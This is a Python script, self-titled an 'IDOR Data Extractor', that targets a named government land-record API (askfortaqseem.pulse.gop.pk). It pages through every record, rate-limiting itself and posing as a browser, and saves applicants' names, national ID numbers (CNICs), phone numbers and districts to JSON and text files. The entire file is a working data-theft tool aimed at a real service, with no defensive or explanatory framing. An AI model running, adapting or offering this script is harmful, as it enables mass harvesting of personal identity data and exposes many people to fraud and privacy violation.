#!/usr/bin/env python3
"""
PULSE.GOP.PK - IDOR Data Extractor (Rate-Limited)
Extracts all 86,888+ applicant records with proper delays
"""

import requests
import json
import time
import os
from datetime import datetime
import sys

BASE_URL = "https://askfortaqseem.pulse.gop.pk/api/LandRecord/GetApplicationForTaqseem"
OUTPUT_DIR = "pulse_data"

class PulseDataExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.all_data = []
        self.cnic_set = set()
        self.phone_set = set()
        self.total_records = 0
        
        if not os.path.exists(OUTPUT_DIR):
            os.makedirs(OUTPUT_DIR)
    
    def get_total_count(self):
        """Get total number of records"""
        try:
            response = self.session.get(f"{BASE_URL}?pageNumber=1&pageSize=1", timeout=30)
            if response.status_code == 200:
                data = response.json()
                self.total_records = data.get('totalCount', 0)
                print(f"[+] Total records found: {self.total_records:,}")
                return self.total_records
        except Exception as e:
            print(f"[-] Error: {e}")
        return 0
    
    def fetch_page(self, page_number, retries=3):
        """Fetch a single page with retries"""
        for attempt in range(retries):
            try:
                params = {
                    'pageNumber': page_number,
                    'pageSize': 100
                }
                
                print(f"[*] Fetching page {page_number} (Attempt {attempt+1}/{retries})...", end='', flush=True)
                response = self.session.get(BASE_URL, params=params, timeout=60)
                
                if response.status_code == 200:
                    data = response.json()
                    records = data.get('data', [])
                    print(f" OK - {len(records)} records")
                    
                    # Extract sensitive data
                    for record in records:
                        cnic = record.get('personCNIC', '')
                        if cnic and cnic != 'string' and len(str(cnic)) >= 10:
                            self.cnic_set.add(str(cnic))
                        
                        phone = record.get('personMobile', '')
                        if phone and phone != 'string' and len(str(phone)) >= 10:
                            self.phone_set.add(str(phone))
                    
                    return records
                else:
                    print(f" FAIL - HTTP {response.status_code}")
                    if attempt < retries - 1:
                        time.sleep(5 * (attempt + 1))
                    continue
                    
            except Exception as e:
                print(f" ERROR - {str(e)[:50]}")
                if attempt < retries - 1:
                    time.sleep(5 * (attempt + 1))
                continue
        
        print(f"[-] Page {page_number}: All retries failed")
        return []
    
    def extract_all_data(self, total_pages):
        """Extract all data sequentially with delays"""
        print(f"\n[+] Starting extraction of {total_pages} pages...")
        print("[+] Press Ctrl+C to stop and save current data\n")
        
        for page in range(1, total_pages + 1):
            records = self.fetch_page(page)
            if records:
                self.all_data.extend(records)
            
            # Progress update every 10 pages
            if page % 10 == 0:
                print(f"[+] Progress: {page}/{total_pages} pages ({len(self.all_data):,} records)")
            
            # Delay between requests (IMPORTANT)
            time.sleep(2)  # 2 second delay
            
            # Save checkpoint every 50 pages
            if page % 50 == 0 and self.all_data:
                self.save_checkpoint(page)
        
        print(f"\n[+] Extraction complete! Total records: {len(self.all_data):,}")
    
    def save_checkpoint(self, page):
        """Save checkpoint to avoid losing progress"""
        checkpoint_file = os.path.join(OUTPUT_DIR, f'checkpoint_page_{page}.json')
        with open(checkpoint_file, 'w', encoding='utf-8') as f:
            json.dump({
                'page': page,
                'records': len(self.all_data),
                'data': self.all_data
            }, f, ensure_ascii=False, indent=2)
        print(f"[+] Checkpoint saved: page {page} ({len(self.all_data):,} records)")
    
    def save_final(self):
        """Save final data"""
        if not self.all_data:
            print("[-] No data to save")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save main JSON
        output_file = os.path.join(OUTPUT_DIR, f'pulse_data_{timestamp}.json')
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump({
                'metadata': {
                    'extracted_at': datetime.now().isoformat(),
                    'total_records': len(self.all_data),
                    'unique_cnics': len(self.cnic_set),
                    'unique_phones': len(self.phone_set),
                    'source': BASE_URL
                },
                'data': self.all_data
            }, f, ensure_ascii=False, indent=2)
        print(f"[+] Saved to: {output_file}")
        
        # Save CNICs
        cnic_file = os.path.join(OUTPUT_DIR, f'cnics_{timestamp}.txt')
        with open(cnic_file, 'w') as f:
            for cnic in sorted(self.cnic_set):
                f.write(f"{cnic}\n")
        print(f"[+] Saved {len(self.cnic_set):,} CNICs to: {cnic_file}")
        
        # Save Phones
        phone_file = os.path.join(OUTPUT_DIR, f'phones_{timestamp}.txt')
        with open(phone_file, 'w') as f:
            for phone in sorted(self.phone_set):
                f.write(f"{phone}\n")
        print(f"[+] Saved {len(self.phone_set):,} phones to: {phone_file}")
        
        return output_file
    
    def run(self):
        """Main execution"""
        print("="*60)
        print("PULSE.GOP.PK - IDOR DATA EXTRACTOR")
        print("Target: askfortaqseem.pulse.gop.pk")
        print("="*60)
        
        total = self.get_total_count()
        if total == 0:
            print("[-] No records found. Exiting.")
            return
        
        total_pages = (total + 100 - 1) // 100
        print(f"[+] Total pages to fetch: {total_pages:,}")
        
        self.extract_all_data(total_pages)
        
        if self.all_data:
            self.save_final()
            
            # Summary
            print("\n" + "="*60)
            print("SUMMARY")
            print("="*60)
            print(f"[+] Total Records: {len(self.all_data):,}")
            print(f"[+] Unique CNICs: {len(self.cnic_set):,}")
            print(f"[+] Unique Phones: {len(self.phone_set):,}")
            
            if self.all_data:
                print("\n[+] Sample Record:")
                sample = self.all_data[0]
                print(f"  Name: {sample.get('personName', 'N/A')}")
                print(f"  CNIC: {sample.get('personCNIC', 'N/A')}")
                print(f"  Phone: {sample.get('personMobile', 'N/A')}")
                print(f"  District: {sample.get('districtName', 'N/A')}")
            
            print("\n[+] Data saved in:", OUTPUT_DIR)
        else:
            print("[-] No data extracted")

def main():
    extractor = PulseDataExtractor()
    try:
        extractor.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted! Saving current data...")
        if extractor.all_data:
            extractor.save_final()
            print(f"[+] Saved {len(extractor.all_data):,} records")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
